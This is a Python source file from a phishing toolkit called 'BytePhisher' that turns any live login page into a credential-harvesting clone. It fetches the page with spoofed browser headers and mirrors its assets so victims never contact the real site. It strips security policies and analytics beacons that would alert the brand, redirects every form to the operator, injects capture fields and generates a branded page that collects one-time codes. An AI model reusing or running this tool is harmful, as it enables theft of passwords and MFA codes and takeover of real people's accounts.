#!/usr/bin/env python3
"""Import any login page as a BytePhisher template.

    python3 tools/import_site.py --url https://example.com/login --name MyCorp
    python3 tools/import_site.py --file ./page.html --name MyCorp --slug mycorp

What it does:
  * fetches the page (or reads a local file) and stores index.html
  * mirrors every asset the page needs (css, js, images, fonts) beside it and
    points the page at the local copies, so the victim's browser never touches
    the real site's CDN - that request is both a correlation risk and a page
    that renders as a broken clone when the asset is blocked
  * follows url() and @import inside stylesheets, rewrites srcset and the lazy
    loading attributes, and strips SRI/crossorigin/CSP that would block the
    local copies
  * points every <form> action at "/" and injects the honeypot, the template id
    and the timing beacon the capture pipeline reads
  * extracts the real form's input names into fields.json (capture_fields) plus
    a field map with types, placeholders and labels
  * writes an otp.html in the page's brand colour
  * writes clone_report.json: what was mirrored, what was skipped and why
  * registers the site in templates/templates.json with the next free index

Everything is written under templates/, so the CLI picks it up immediately:
    ./bytephisher.py --list | grep mycorp
"""
import argparse
import html
import json
import os
import re
import sys
import time
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
TEMPLATES = os.path.join(os.environ.get("BYTEPHISHER_HOME") or HERE, "templates")

# A real browser's request. The importer is fetching a page the operator is
# authorised to test; it must not announce itself as a tool.
BROWSER_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,*/*;q=0.8"),
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Upgrade-Insecure-Requests": "1",
}

# A bot wall answers these instead of the page. The clone would then be of the
# challenge page, so the importer reports it instead of writing a useless template.
WAF_MARKERS = ("cf-challenge", "just a moment", "attention required",
               "checking your browser", "enable javascript and cookies",
               "access denied", "request blocked", "captcha",
               "incapsula incident", "px-captcha", "datadome")


class FormScanner(HTMLParser):
    """Collect <form> actions and every <input>/<select>/<textarea> name."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.inputs = []          # (name, type, placeholder)
        self.actions = []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            if a.get("action"):
                self.actions.append(a["action"])
        elif tag in ("input", "select", "textarea"):
            name = a.get("name")
            if name:
                self.inputs.append((name, a.get("type", "text"), a.get("placeholder", "")))

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)


ALLOWED_SCHEMES = ("http://", "https://")


def fetch(url, timeout=25, retries=2, cookie=None, user_agent=None):
    """Fetch a page. Only http(s) is allowed: urllib happily reads file://,
    so an unvalidated scheme turned this into a local-file reader.

    Retries a transient failure with a short backoff, because a single reset
    should not cost the operator the clone.
    """
    if not str(url).lower().startswith(ALLOWED_SCHEMES):
        raise ValueError("only http:// and https:// URLs can be imported")
    from core import net
    headers = dict(BROWSER_HEADERS)
    if user_agent:
        headers["User-Agent"] = user_agent
    if cookie:
        headers["Cookie"] = cookie
    last = None
    for attempt in range(max(1, retries + 1)):
        try:
            return net.fetch_text(url, timeout=timeout, headers=headers)
        except Exception as exc:                     # noqa: BLE001
            last = exc
            if attempt < retries:
                time.sleep(0.6 * (attempt + 1))
    raise last or RuntimeError("fetch failed with no exception recorded")


def looks_like_a_bot_wall(text):
    """True when the body is a challenge page rather than the login page."""
    head = str(text or "")[:4000].lower()
    return any(marker in head for marker in WAF_MARKERS)


def absolutize(html_text, base_url):
    """Rewrite relative href/src/action URLs so assets still load."""
    def repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        if value.startswith(("http://", "https://", "//", "data:", "#", "javascript:")):
            return m.group(0)
        return f'{attr}={quote}{urljoin(base_url, value)}{quote}'
    return re.sub(r'\b(href|src|action|poster)\s*=\s*(["\'`])([^"\'`]+)\2',
                  repl, html_text, flags=re.I)


# ---------------------------------------------------------------- mirroring ---
# Anything in this list is a beacon, not an asset: mirroring it would still let the
# real site see the victim. The tag is removed and reported.
TRACKER_HOSTS = (
    "google-analytics.com", "googletagmanager.com", "googleadservices.com",
    "doubleclick.net", "connect.facebook.net", "facebook.net", "facebook.com/tr",
    "hotjar.com", "hotjar.io", "segment.com", "segment.io", "mixpanel.com",
    "sentry.io", "newrelic.com", "nr-data.net", "cloudflareinsights.com",
    "clarity.ms", "amplitude.com", "fullstory.com", "optimizely.com",
    "intercom.io", "intercomcdn.com", "drift.com", "hubspot.com", "hs-scripts.com",
    "criteo.com", "criteo.net", "taboola.com", "outbrain.com", "quantserve.com",
    "scorecardresearch.com", "bat.bing.com", "mc.yandex.ru", "top-fwz1.mail.ru",
    "vk.com/rtrg", "analytics.tiktok.com", "pinterest.com/ct", "snap.licdn.com",
    "px.ads.linkedin.com", "tr.snapchat.com", "static.ads-twitter.com",
)

# href/src/poster/data-src/data-bg and the srcset family all name assets
ASSET_ATTR = re.compile(r"\b(href|src|poster|data-src|data-bg)\s*=\s*([\"'])([^\"']+)\2", re.I)
SRCSET_ATTR = re.compile(r"\b(srcset|data-srcset|imagesrcset)\s*=\s*([\"'])([^\"']+)\2", re.I)
CSS_URL = re.compile(r"url\(\s*([\"']?)([^\"')]+)\1\s*\)", re.I)
CSS_IMPORT = re.compile(r"@import\s+(?:url\(\s*)?([\"']?)([^\"')\s;]+)\1\s*\)?", re.I)
TAG_RE = re.compile(r"<(script|link)\b[^>]*>", re.I)
BASE_TAG = re.compile(r"<base\b[^>]*>", re.I)
CSP_META = re.compile(
    r"<meta\b[^>]*http-equiv\s*=\s*[\"']?content-security-policy[\"']?[^>]*>", re.I)
NONCE_ATTR = re.compile(r"\s+nonce\s*=\s*([\"'])[^\"']*\1", re.I)
EXT_BY_TYPE = {".css": "text/css", ".js": "application/javascript",
               ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
               ".gif": "image/gif", ".svg": "image/svg+xml", ".webp": "image/webp",
               ".avif": "image/avif", ".ico": "image/x-icon", ".woff": "font/woff",
               ".woff2": "font/woff2", ".ttf": "font/ttf", ".otf": "font/otf",
               ".eot": "application/vnd.ms-fontobject", ".json": "application/json",
               ".mp4": "video/mp4", ".webm": "video/webm", ".mp3": "audio/mpeg"}
# source maps are noise, and a `?v=` query on a font is the same file
SKIP_EXT = (".map", ".gz", ".br")


def is_tracker(url):
    u = str(url or "").lower()
    return any(h in u for h in TRACKER_HOSTS)


def _is_asset_ref(value):
    """Is this reference an asset worth mirroring?

    A bare origin (`https://cdn.example.com`) is not: fetching it returns an error
    and it is never a stylesheet/image.
    """
    v = str(value or "").strip()
    if not v or v.startswith(("#", "data:", "javascript:", "mailto:", "tel:", "blob:")):
        return False
    if v.lower().startswith(("http://", "https://")):
        return bool(urlsplit(v).path.strip("/"))
    return True


def _local_name(url, used):
    """A stable, collision-free filename for a mirrored asset.

    The query string is dropped: `font.woff2?v=3` and `font.woff2` are one file, and
    a `?` in a filename is not portable.
    """
    path = urlsplit(url).path or "/asset"
    base = os.path.basename(path) or "asset"
    base = re.sub(r"[^A-Za-z0-9._-]+", "_", base)[:60] or "asset"
    if not os.path.splitext(base)[1]:
        base += ".bin"
    if base not in used:
        used.add(base)
        return base
    root, ext = os.path.splitext(base)
    i = 2
    while f"{root}_{i}{ext}" in used:
        i += 1
    used.add(f"{root}_{i}{ext}")
    return f"{root}_{i}{ext}"


def _get_bytes(url, timeout=20, cookie=None, user_agent=None):
    """Raw bytes of a URL through core.net (IPv4-preferring, no Referer)."""
    from core import net
    headers = {"User-Agent": user_agent or BROWSER_HEADERS["User-Agent"],
               "Accept": "*/*"}
    if cookie:
        headers["Cookie"] = cookie
    with net.urlopen(url, timeout=timeout, headers=headers) as r:
        return r.read()


def _asset_urls_in(text):
    """Every asset reference in a chunk of markup or CSS, as absolute-ready strings."""
    found = []
    for m in ASSET_ATTR.finditer(text):
        found.append(m.group(3))
    for m in SRCSET_ATTR.finditer(text):
        for part in m.group(3).split(","):
            candidate = part.strip().split(" ")[0]
            if candidate:
                found.append(candidate)
    for m in CSS_URL.finditer(text):
        found.append(m.group(2))
    for m in CSS_IMPORT.finditer(text):
        found.append(m.group(1))
    return found


def mirror_assets(html_text, base_url, folder, limit_files=80,
                  limit_bytes=12 * 1024 * 1024, log=None, depth_limit=2,
                  cookie=None, user_agent=None):
    """Download the page's own assets beside it and point the page at them.

    Returns {"mirrored": [...], "bytes": int, "trackers_removed": [...],
             "skipped": [...], "remaining_remote": [...]}. Never raises: a single
    failed asset is reported and left as it was, because a half-mirrored page
    still has to render.
    """
    say = log or (lambda *a: None)
    out_dir = os.path.join(folder, "assets")
    report = {"mirrored": [], "bytes": 0, "trackers_removed": [], "skipped": [],
              "srcset_rewritten": 0, "css_imports": 0, "csp_stripped": 0,
              "base_dropped": 0}
    used, mapping = set(), {}

    def note_skip(url, why):
        report["skipped"].append({"url": url, "why": why})

    def fetch_one(url, depth=0, in_css=False):
        """Mirror one asset; returns the local path (relative to the page) or None."""
        if url in mapping:
            return mapping[url]
        if len(report["mirrored"]) >= limit_files:
            note_skip(url, "file limit reached")
            return None
        if report["bytes"] >= limit_bytes:
            note_skip(url, "size limit reached")
            return None
        if urlsplit(url).path.lower().endswith(SKIP_EXT):
            note_skip(url, "not an asset")
            return None
        try:
            raw = _get_bytes(url, cookie=cookie, user_agent=user_agent)
        except Exception as e:                              # noqa: BLE001
            note_skip(url, f"{type(e).__name__}")
            return None
        if len(raw) + report["bytes"] > limit_bytes:
            note_skip(url, "size limit reached")
            return None
        name = _local_name(url, used)
        os.makedirs(out_dir, exist_ok=True)
        ext = os.path.splitext(name)[1].lower()
        # A stylesheet pulls fonts and images of its own, and its url() values are
        # relative to the stylesheet, not to the page: rewrite them to the bare
        # filename so the browser resolves them inside assets/ (a leading
        # "assets/" here would resolve to assets/assets/ and 404).
        if ext == ".css" and depth < depth_limit:
            text = raw.decode("utf-8", "replace")

            def css_repl(m):
                inner = m.group(2)
                if inner.startswith(("data:", "#")):
                    return m.group(0)
                target = urljoin(url, inner)
                if is_tracker(target):
                    return m.group(0)
                local = fetch_one(target, depth + 1, in_css=True)
                if not local:
                    return m.group(0)
                return f"url({os.path.basename(local)})"

            text = CSS_URL.sub(css_repl, text)

            def import_repl(m):
                inner = m.group(2)
                if inner.startswith(("data:", "#")):
                    return m.group(0)
                target = urljoin(url, inner)
                if is_tracker(target):
                    return m.group(0)
                local = fetch_one(target, depth + 1, in_css=True)
                if not local:
                    return m.group(0)
                report["css_imports"] += 1
                return f"@import url({os.path.basename(local)})"

            text = CSS_IMPORT.sub(import_repl, text)
            raw = text.encode("utf-8")
        with open(os.path.join(out_dir, name), "wb") as f:
            f.write(raw)
        report["mirrored"].append(name)
        report["bytes"] += len(raw)
        mapping[url] = name if in_css else f"assets/{name}"
        say(f"   mirrored {name} ({len(raw)} bytes) <- {url[:70]}")
        return mapping[url]

    # 1) drop the page's <base>: it would send every relative URL back to the brand
    html_text, dropped = BASE_TAG.subn("", html_text)
    report["base_dropped"] = dropped
    # 2) a CSP meta would block our local assets and inline beacon
    html_text, csp = CSP_META.subn("", html_text)
    report["csp_stripped"] = csp
    html_text = NONCE_ATTR.sub("", html_text)

    # 3) remove beacons outright
    def tag_repl(m):
        tag = m.group(0)
        ref = ASSET_ATTR.search(tag)
        if ref and is_tracker(urljoin(base_url, ref.group(3))):
            report["trackers_removed"].append(urljoin(base_url, ref.group(3)))
            return ""
        return tag

    html_text = TAG_RE.sub(tag_repl, html_text)

    # 4) mirror what is left, including url() inside inline styles
    def attr_repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        if not _is_asset_ref(value):
            return m.group(0)
        absolute = urljoin(base_url, value)
        if is_tracker(absolute):
            return m.group(0)
        local = fetch_one(absolute)
        if not local:
            return m.group(0)
        return f'{attr}={quote}{local}{quote}'

    html_text = ASSET_ATTR.sub(attr_repl, html_text)

    def srcset_repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        out = []
        for part in value.split(","):
            piece = part.strip()
            if not piece:
                continue
            url_part, _, descriptor = piece.partition(" ")
            if not _is_asset_ref(url_part):
                out.append(piece)
                continue
            absolute = urljoin(base_url, url_part)
            local = None if is_tracker(absolute) else fetch_one(absolute)
            out.append(f"{local or url_part} {descriptor}".strip())
            if local:
                report["srcset_rewritten"] += 1
        return f"{attr}={quote}{', '.join(out)}{quote}"

    html_text = SRCSET_ATTR.sub(srcset_repl, html_text)

    def inline_css_repl(m):
        inner = m.group(2)
        if inner.startswith(("data:", "#")):
            return m.group(0)
        local = fetch_one(urljoin(base_url, inner))
        return f"url({local})" if local else m.group(0)

    html_text = CSS_URL.sub(inline_css_repl, html_text)
    # SRI and crossorigin would block our local copies
    html_text = re.sub(r'\s+integrity\s*=\s*(["\']).*?\1', "", html_text, flags=re.I)
    html_text = re.sub(r'\s+crossorigin\s*=\s*(["\'])[^"\']*\1', "", html_text,
                       flags=re.I)
    # assets only: a footer <a href="https://brand.com/terms"> is a link, not a
    # remote dependency, and counting it made the report look wrong
    remote = set(re.findall(r'\bsrc\s*=\s*["\'](https?://[^"\']+)', html_text, re.I))
    for tag in re.findall(r"<link\b[^>]*>", html_text, re.I):
        remote |= set(re.findall(r'\bhref\s*=\s*["\'](https?://[^"\']+)', tag, re.I))
    report["remaining_remote"] = sorted(remote)
    return html_text, report


def neutralise_forms(html_text):
    """Point every form at "/" and drop method overrides we don't need."""
    def repl(m):
        tag = m.group(0)
        tag = re.sub(r'action\s*=\s*(["\']).*?\1', 'action="/"', tag, flags=re.I)
        if not re.search(r'action\s*=', tag, flags=re.I):
            tag = tag.replace("<form", '<form action="/"', 1)
        tag = re.sub(r'method\s*=\s*(["\'])\w+\1', 'method="POST"', tag, flags=re.I)
        return tag
    return re.sub(r"<form\b[^>]*>", repl, html_text, flags=re.I)


# ------------------------------------------------------- capture integration ---
# The page the operator imported knows nothing about this tool. These are the
# fields the capture pipeline reads, so the clone has to carry them.
BOT_WALL_BEACON = """
<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
"""


def inject_capture(html_text, slug):
    """Add the honeypot, the template id and the timing beacon to the login form.

    Returns (html, injected_bool). The fields go into the FIRST form that has a
    password field - that is the login form on every page that has one - and the
    beacon goes before </body>. An imported page that carries none of this would
    capture credentials but no timing signal and no template attribution.
    """
    forms = list(re.finditer(r"<form\b[^>]*>", html_text, re.I))
    if not forms:
        return html_text, False
    target = None
    for m in forms:
        tail = html_text[m.end():m.end() + 4000]
        if re.search(r'type\s*=\s*["\']?password', tail, re.I):
            target = m
            break
    if target is None:
        target = forms[0]
    block = (
        '\n<input class="hp" type="text" name="hp_email" value="" tabindex="-1" '
        'autocomplete="off" style="position:absolute;left:-9999px;width:1px;'
        'height:1px;opacity:0">\n'
        f'<input type="hidden" name="_tpl" value="{slug}">\n'
        '<input type="hidden" name="_ts" value="__TS__">\n'
    )
    html_text = html_text[:target.end()] + block + html_text[target.end():]
    if "</body>" in html_text.lower():
        idx = html_text.lower().rindex("</body>")
        html_text = html_text[:idx] + BOT_WALL_BEACON + html_text[idx:]
    else:
        html_text += BOT_WALL_BEACON
    return html_text, True


def analyse_page(html_text):
    """What the page's own form says about itself.

    Returns {"fields": [{name,type,placeholder,label,autocomplete}],
             "otp_fields": [...], "has_password": bool, "has_otp": bool}.

    The field map is written into fields.json, so an operator reviewing a clone
    sees the real names the page posts rather than a guess.
    """
    scanner = FieldScanner()
    scanner.feed(html_text)
    fields = scanner.fields
    otp = [f["name"] for f in fields
           if re.search(r"otp|one.?time|code|token|pin|passcode", f["name"], re.I)]
    otp += [f["name"] for f in fields
            if re.fullmatch(r"(otp|code|pin)?_?\d", f["name"], re.I)]
    seen, otp_fields = set(), []
    for name in otp:
        if name not in seen:
            seen.add(name)
            otp_fields.append(name)
    return {"fields": fields, "otp_fields": otp_fields,
            "has_password": any(f["type"] == "password" for f in fields),
            "has_otp": bool(otp_fields)}


class FieldScanner(HTMLParser):
    """Every input/select/textarea with the label that names it."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.fields = []
        self._labels = {}
        self._pending_label = None
        self._pending_for = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "label":
            self._pending_for = a.get("for")
            self._pending_label = []
        elif tag in ("input", "select", "textarea"):
            name = a.get("name") or a.get("id")
            if not name:
                return
            self.fields.append({
                "name": name,
                "type": a.get("type", "text" if tag == "input" else tag),
                "placeholder": a.get("placeholder", ""),
                "autocomplete": a.get("autocomplete", ""),
                "label": self._labels.get(name, ""),
            })

    def handle_endtag(self, tag):
        if tag == "label" and self._pending_label is not None:
            text = " ".join("".join(self._pending_label).split())
            if self._pending_for and text:
                self._labels[self._pending_for] = text
            self._pending_label = None

    def handle_data(self, data):
        if self._pending_label is not None:
            self._pending_label.append(data)


def _safe_slug(value):
    """A slug that can only ever be one path segment.

    The slug becomes the template's folder name. `../../evil` (or any value with a
    separator) used to escape the templates root and write outside it; everything
    outside `[a-z0-9-]` is collapsed to a hyphen and an empty result falls back to
    a fixed name, so the folder can never climb out of TEMPLATES.
    """
    slug = re.sub(r"[^a-z0-9-]+", "-", str(value or "").lower()).strip("-")
    slug = re.sub(r"-{2,}", "-", slug)
    if not slug or ".." in slug:
        return "import"
    return slug


def brand_colour(html_text, default="#2563eb"):
    """The page's own accent: the most common 6-digit hex in its markup.

    A page's accent colour appears many times and a stray colour once, so the
    count decides it. Case is ignored for the count and the spelling seen first is
    the one returned, so a page that writes #AB12CD keeps it.
    """
    counts, spelling = {}, {}
    for m in re.finditer(r"#([0-9a-fA-F]{6})\b", str(html_text or "")):
        key = m.group(1).lower()
        counts[key] = counts.get(key, 0) + 1
        spelling.setdefault(key, m.group(1))
    if not counts:
        return default
    best = max(counts, key=lambda k: counts[k])
    return "#" + spelling[best]


def otp_page(name, brand, slug, label="verification code"):
    """The code page for an imported site, in the page's own brand colour.

    `name` is operator text and lands in the title and body: it is escaped so a
    `--name '<script>...'` cannot inject markup into the generated page.
    """
    from tools import template_themes as themes
    from tools.gen_templates import favicon_uri
    raw_name = str(name or "")
    initial = (raw_name[:1] or "?").upper()
    skin = dict(themes.OTP_SKIN["card"])
    skin["heading"] = f"Enter your {html.escape(str(label))}"
    skin["sub"] = ("We sent a " + html.escape(str(label)) + " to your phone and email. "
                   "Enter it below to finish signing in to " + html.escape(raw_name) + ".")
    return themes._otp_page(slug, raw_name, brand, themes.monogram(initial, brand),
                            label, favicon_uri(initial, brand), **skin)


def _load_json(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def _dump_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


def import_site(url=None, file=None, name=None, slug=None, index=None, keep_otp=True,
                mirror=True, mirror_limit=80, log=None, timeout=25, retries=2,
                cookie=None, user_agent=None, strip_scripts=False):
    if not url and not file:
        raise SystemExit("pass --url or --file")
    final_url = url
    warning = None
    if url:
        html_text = fetch(url, timeout=timeout, retries=retries, cookie=cookie,
                          user_agent=user_agent)
        if looks_like_a_bot_wall(html_text):
            warning = ("the response looks like a bot wall or a block page, not the "
                       "login page: check the clone before using it")
    else:
        with open(file, encoding="utf-8", errors="replace") as f:
            html_text = f.read()
    report = None
    if url and not mirror:
        html_text = absolutize(html_text, url)
    html_text = neutralise_forms(html_text)

    scanner = FormScanner()
    scanner.feed(html_text)
    analysis = analyse_page(html_text)

    names = [n for n, _t, _p in scanner.inputs]
    # de-dupe, keep order; ensure a password field is present for verification
    seen, capture_fields = set(), []
    for n in names:
        if n not in seen:
            seen.add(n)
            capture_fields.append(n)
    if analysis["has_password"] and not any(
            f["type"] == "password" for f in analysis["fields"] if f["name"] in seen):
        capture_fields.append("password")

    slug = _safe_slug(slug or name or "import")
    man_path = os.path.join(TEMPLATES, "templates.json")
    manifest = (_load_json(man_path) if os.path.isfile(man_path) else [])
    if index is None:
        index = max([t["index"] for t in manifest], default=0) + 1

    folder = os.path.join(TEMPLATES, f"{index:02d}_{slug}")
    root = os.path.abspath(TEMPLATES)
    if os.path.commonpath([os.path.abspath(folder), root]) != root:
        # belt and braces: even a sanitised slug must land inside the root
        raise SystemExit(f"refusing to write a template outside {root}: {slug!r}")
    os.makedirs(folder, exist_ok=True)
    if url and mirror:
        # mirror the page's own assets locally: the victim's browser must never
        # touch the real site's CDN (that is a correlation and a broken-clone risk)
        html_text, report = mirror_assets(html_text, final_url, folder,
                                          limit_files=mirror_limit, log=log,
                                          cookie=cookie, user_agent=user_agent)
    if strip_scripts:
        removed = len(re.findall(r"<script\b", html_text, re.I))
        html_text = re.sub(r"<script\b[^>]*>.*?</script>", "", html_text,
                           flags=re.I | re.S)
        html_text = re.sub(r"<script\b[^>]*/?>", "", html_text, flags=re.I)
        if report is not None:
            report["scripts_removed"] = removed
    # the capture pipeline's own fields go in last, so the field list stays the
    # page's real names
    html_text, injected = inject_capture(html_text, slug)

    with open(os.path.join(folder, "index.html"), "w", encoding="utf-8") as f:
        f.write(html_text)
    brand = brand_colour(html_text)
    if keep_otp:
        with open(os.path.join(folder, "otp.html"), "w", encoding="utf-8") as f:
            f.write(otp_page(name or slug, brand, slug))
    fields_json = {
        "capture_fields": capture_fields,
        "otp_fields": [f"otp_{i}" for i in range(1, 7)],
        "honeypot": "hp_email",
        "has_otp": bool(keep_otp),
        "imported": {"url": url, "file": file, "final_url": final_url},
        "form_fields": analysis["fields"],
        "page_otp_fields": analysis["otp_fields"],
        "capture_injected": injected,
        "brand": brand,
    }
    with open(os.path.join(folder, "fields.json"), "w", encoding="utf-8") as f:
        json.dump(fields_json, f, indent=2)

    clone_report = {
        "url": url, "file": file, "final_url": final_url, "slug": slug,
        "name": name or slug, "capture_fields": capture_fields,
        "form_actions_seen": scanner.actions,
        "capture_injected": injected,
        "brand": brand,
        "warning": warning,
        "mirror": report,
    }
    with open(os.path.join(folder, "clone_report.json"), "w", encoding="utf-8") as f:
        json.dump(clone_report, f, indent=2)

    manifest = [t for t in manifest if t["index"] != index]
    manifest.append({"index": index, "slug": slug, "name": name or slug, "dir": folder})
    manifest.sort(key=lambda t: t["index"])
    _dump_json(man_path, manifest)

    out = {"index": index, "slug": slug, "dir": folder,
           "capture_fields": capture_fields, "form_actions_seen": scanner.actions,
           "capture_injected": injected, "warning": warning,
           "form_fields": analysis["fields"]}
    if report is not None:
        out["mirror"] = report
    return out


def main():
    ap = argparse.ArgumentParser(description="Import a login page as a BytePhisher template")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--url", help="live login page URL")
    src.add_argument("--file", help="local HTML file")
    ap.add_argument("--name", required=True, help="display name (e.g. 'MyCorp SSO')")
    ap.add_argument("--slug", help="folder slug (default: derived from --name)")
    ap.add_argument("--index", type=int, help="template index (default: next free)")
    ap.add_argument("--no-mirror", "--keep-remote", action="store_true", dest="no_mirror",
                    help="keep absolute asset URLs instead of downloading them "
                         "(the victim's browser would then load CSS/JS/images from "
                         "the real site, which the target can see)")
    ap.add_argument("--mirror-limit", type=int, default=80,
                    help="maximum number of assets to mirror (default 80)")
    ap.add_argument("--timeout", type=int, default=25, help="fetch timeout in seconds")
    ap.add_argument("--retries", type=int, default=2, help="fetch retries on failure")
    ap.add_argument("--user-agent", default="", help="override the request User-Agent")
    ap.add_argument("--cookie", default="",
                    help="send this Cookie header (for a page behind a login)")
    ap.add_argument("--no-js", action="store_true", dest="no_js",
                    help="strip every <script> from the clone (a static page with no "
                         "client-side checks; the capture beacon is re-added)")
    args = ap.parse_args()

    res = import_site(url=args.url, file=args.file, name=args.name,
                      slug=args.slug, index=args.index,
                      mirror=not args.no_mirror, mirror_limit=args.mirror_limit,
                      timeout=args.timeout, retries=args.retries,
                      cookie=args.cookie or None,
                      user_agent=args.user_agent or None,
                      strip_scripts=args.no_js,
                      log=lambda m: print(m))
    print(f"[bytephisher] imported -> {res['dir']}")
    print(f"[bytephisher] index    : {res['index']}  (select with -o {res['index']})")
    print(f"[bytephisher] fields   : {', '.join(res['capture_fields']) or '(none found)'}")
    print(f"[bytephisher] forms    : {res['form_actions_seen'] or '(no action attributes)'}")
    if res.get("form_fields"):
        print(f"[bytephisher] form map : {len(res['form_fields'])} field(s) recorded")
    if not res.get("capture_injected"):
        print("[bytephisher] warning  : no <form> found, so no honeypot or template id "
              "was injected")
    if res.get("warning"):
        print(f"[bytephisher] warning  : {res['warning']}")
    m = res.get("mirror")
    if m:
        print(f"[bytephisher] mirrored : {len(m['mirrored'])} asset(s), "
              f"{m['bytes']} bytes, self-contained")
        if m.get("srcset_rewritten"):
            print(f"[bytephisher] srcset   : rewrote {m['srcset_rewritten']} candidate(s)")
        if m["trackers_removed"]:
            print(f"[bytephisher] trackers : removed {len(m['trackers_removed'])} "
                  f"beacon script(s) (they would report the victim to the brand)")
        if m["skipped"]:
            print(f"[bytephisher] skipped  : {len(m['skipped'])} "
                  f"(first: {m['skipped'][0]['url'][:60]} - {m['skipped'][0]['why']})")
        if m.get("remaining_remote"):
            print(f"[bytephisher] still remote: {m['remaining_remote'][:3]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
